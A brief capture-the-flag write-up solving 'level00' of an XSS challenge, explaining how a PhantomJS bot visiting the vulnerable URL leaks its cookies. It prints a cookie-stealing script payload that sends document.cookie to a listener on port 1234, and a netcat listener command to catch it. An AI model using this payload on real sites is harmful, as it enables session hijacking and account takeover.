The easiest way to solve level00 would probably be something like 

<script>
new Image().src="http://127.0.0.1:1234/"+(document.cookie);
</script>

and then using netcat `nc -lvp 1234` to listen on the custom port choise of yours.

Once our PhantomJS XSS bot accesses the vulnerable URL and executes our payload, 
we receive a callback to our listener with the cookies included in the request path.
After then it's just extracting it and login to the next level, and here you are :)
